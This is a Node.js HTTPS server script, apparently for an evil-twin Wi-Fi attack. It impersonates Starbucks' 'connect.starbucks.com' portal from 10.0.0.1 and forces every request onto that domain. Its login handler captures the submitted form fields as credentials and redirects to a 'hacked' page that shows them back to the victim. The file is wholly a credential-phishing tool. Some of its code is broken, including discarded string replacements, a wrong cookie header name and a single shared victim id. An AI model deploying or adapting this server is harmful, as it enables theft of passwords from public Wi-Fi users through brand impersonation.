const https = require('https');
const fs = require('fs');
const domainName = 'connect.starbucks.com';
let credentials = {};

function handleGet(req, res) {
  if (req.headers.host != domainName) {
    writeResponse(res, 302, {'Location': 'https://' + domainName + '/'}, 'Loading...');
    return;
  }
  let cookies = parseCookies(req.headers.cookieHeader);
  let resource = req.url;
  switch (resource) {
    case '/':
      resource = '/login.html';
      break;
    case '/gg':
      resource = '/hacked.html';
      break;
  }
  let resourcePath = __dirname + '/resources' + resource;
  fs.readFile(resourcePath, (error, content) => {
    if (error) {
      writeResponse(res, 404, {}, 'Not Found');
    } else {
      if (resource == '/hacked.html') {
        content.replace('[PLACEHOLDER_USERNAME]', credentials[cookies.id].username);
        content.replace('[PLACEHOLDER_PASSWORD]', credentials[cookies.id].password);
      }
      writeResponse(res, 200, {}, content);
    }
  });
}

function handlePost(req, res) {
  if (req.headers.host != domainName) {
    writeResponse(res, 302, {'Location': 'https://' + domainName + '/'}, 'Loading...');
    return;
  }
  let resource = req.url;
  switch (resource) {
    case '/login':
      readBody(req, body => {
        credentials['a'] = {};
        let pairs = body.split('&');
        pairs.forEach(pair => {
          let [key, value] = pair.split('=');
          credentials['a'][key] = value;
        });
        writeResponse(res, 302, {'Location': '/gg', 'Set-Cookie': 'id=' + 'a'}, 'Loading...');
      });
      break;
    default:
      writeResponse(res, 400, {}, 'Bad Request');
      break;
  }
}

function handleUnsupported(req, res) {
  writeResponse(res, 400, {}, 'Bad Request');
}

function writeResponse(res, statusCode, headers, content) {
  Object.entries(headers).forEach(entry => {
    const [key, value] = entry;
    res.setHeader(key, value);
  });
  res.writeHead(statusCode);
  res.end(content);
}

function readBody(req, callback) {
  let body = '';
  req
  .on('data', chunk => {
    body += chunk;
  })
  .on('end', () => {
    return callback(body);
  });
}

function parseCookies(cookieHeader) {
  let cookies = {};
  if (!cookieHeader) {
    return cookies;
  }
  cookieHeader.split(';').forEach(cookie => {
    let [key, value] = cookie.split('=');
    cookies[key] = value;
  });
  return cookies;
}

const encryption = {
  key: fs.readFileSync(__dirname + '/cert' + '/key.pem'),
  cert: fs.readFileSync(__dirname + '/cert' + '/cert.pem')
}

https.createServer(encryption, (req, res) => {
  console.log(req.method + ': ' + req.headers.host + req.url);
  switch (req.method) {
    case 'GET':
      handleGet(req, res);
      break;
    case 'POST':
      handlePost(req, res);
      break;
    default:
      handleUnsupported(req, res);
      break;
  }
}).listen(443, '10.0.0.1');

console.log('Web server listening on 10.0.0.1:443');